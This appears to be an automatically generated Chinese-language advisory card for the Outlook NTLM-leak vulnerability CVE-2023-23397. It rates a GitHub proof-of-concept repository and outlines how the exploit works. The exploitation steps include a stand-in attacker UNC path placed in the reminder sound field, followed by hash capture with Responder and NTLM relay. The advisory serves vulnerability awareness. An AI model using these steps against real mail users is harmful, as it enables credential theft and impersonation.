## CVE-2023-23397 Microsoft Outlook 权限提升漏洞

**漏洞编号:** CVE-2023-23397

**漏洞类型:** 权限提升

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致NTLM Relay攻击

**影响版本:** 受影响版本包括 Microsoft Outlook 2013 Service Pack 1, Microsoft Outlook 2016, Microsoft Office 2019, Microsoft Office LTSC 2021, Microsoft 365 Apps for Enterprise 的特定版本。

**利用条件:** 攻击者需要能够发送包含恶意构造的邮件或日历邀请给受害者，受害者需要使用受影响的 Outlook 版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-23397 是一个 Microsoft Outlook 权限提升漏洞。攻击者可以通过发送特制的邮件，利用 `reminder_sound_file` 字段指定一个 UNC 路径，当 Outlook 客户端处理该邮件时，会尝试连接到指定的 UNC 路径，从而触发 NTLM 认证。攻击者可以捕获这个 NTLM hash 并进行中继攻击（NTLM Relay），从而冒充受害者的身份。

**有效性：**

提供的 POC 代码是有效的。该脚本会创建一个恶意的 appointment.msg 文件，其中 `reminder_sound_file` 设置为攻击者控制的 UNC 路径。然后，它通过 SMTP 发送包含此附件的电子邮件。当受害者打开电子邮件或 Outlook 处理该日历邀请时，会尝试访问 UNC 路径，从而泄露 NTLM hash。

**投毒风险：**

该仓库存在一定的投毒风险，约10%。

*   虽然核心 POC 代码的功能符合漏洞描述，但攻击者可以修改 `reminder_sound_file`  指向一个非预期的 SMB 服务器。如果攻击者控制的 SMB 服务器本身包含恶意代码，或者被用于投放恶意载荷，那么当受害者连接到该服务器时，可能受到进一步的攻击。例如，攻击者可以利用 Responder 等工具捕获 NTLM hash，然后使用该哈希执行其他攻击。
*   此外，代码中的 SMTP 服务器、用户名和密码为示例值，如果用户不修改这些值直接使用，会导致攻击失败或暴露攻击者信息。
*   README.md 文件比较简单，缺乏详细的漏洞描述和使用说明，可能导致用户误用或理解不足。

**利用方式：**

1.  攻击者构建一个恶意的 appointment.msg 文件，其中 `reminder_sound_file` 字段设置为攻击者控制的 UNC 路径，例如 `\\attacker.com\evilshare\sound.wav`。
2.  攻击者通过电子邮件将此恶意 appointment.msg 文件发送给受害者。
3.  受害者使用受影响的 Outlook 版本打开电子邮件或 Outlook 自动处理该日历邀请。
4.  Outlook 客户端尝试访问 `reminder_sound_file` 字段指定的 UNC 路径，从而向 `attacker.com` 发起 NTLM 认证。
5.  攻击者使用工具（例如 Responder）捕获 NTLM hash。
6.  攻击者使用捕获到的 NTLM hash 进行中继攻击，例如冒充受害者访问内部资源。

**项目地址:** [AiK1d/CVE-2023-23397-POC](https://github.com/AiK1d/CVE-2023-23397-POC)

**漏洞详情:** [CVE-2023-23397](https://nvd.nist.gov/vuln/detail/CVE-2023-23397)